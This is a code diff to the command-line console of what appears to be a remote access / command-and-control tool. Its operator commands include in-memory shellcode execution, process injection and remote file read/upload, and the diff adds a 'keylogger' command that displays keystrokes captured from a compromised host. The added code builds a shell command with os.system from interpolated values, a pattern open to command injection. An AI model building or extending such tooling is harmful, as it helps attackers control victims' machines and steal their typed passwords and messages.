@@ -39,6 +39,7 @@ class Cli:
         self.shell_cmds["inject"] = self.inject
         self.shell_cmds["alias"] = self.set_alias
         self.shell_cmds["background"] = None
+	self.shell_cmds["keylogger"] = self.keylogger
         self.shell_cmds["exit"] = None
 
         self.config = config
@@ -233,11 +234,11 @@ class Cli:
     def show_help_shell(self, data):
         print("\nHelp Menu\n"+"="*9)
         print("\n"+ tabulate({
-            "Commands":["background","fetch","exec","read","upload","ps","inject","alias","delay","help"],
-            "Args":["","","path/url, cmd","path/url","remote path","path/url, path","pid, command","key, value","milliseconds"],
+            "Commands":["background","fetch","exec","read","upload","ps","inject","keylogger", "alias","delay","help"],
+            "Args":["","","path/url, cmd","path/url","remote path","path/url, path","pid, command","number of line (default 20)","key, value","milliseconds"],
             "Descriptions":["Return to the main console","In memory execution of a script and execute a command",
                             "In memory execution of code (shellcode)","Read a file on the remote host","Upload a file on the remote system",
-                            "List processes","Inject command into a target process (max length 4096)",
+                            "List processes","Inject command into a target process (max length 4096)", "Show last n line of keystrokes captured",
                             "Create an alias to avoid typing the same thing over and over","Update the callback delay","show this help menu"]
         }, headers='keys', tablefmt="simple"))
         self.alias.list_alias()
@@ -265,6 +266,15 @@ class Cli:
         else:
             UI.error("Cannot fetch the resource")
             return ""
+    def keylogger(self, data):
+	size = Utils.get_arg_at(data, 1, 2)
+	try:
+		size = int(size)
+	except:
+		size = 20
+
+	output = os.system("tail -n %d %skeylogger_%s.log" % (size, Log.create_folder_tree(), self.guid))
+	return ""
         
     def read_file(self, data):
         try:
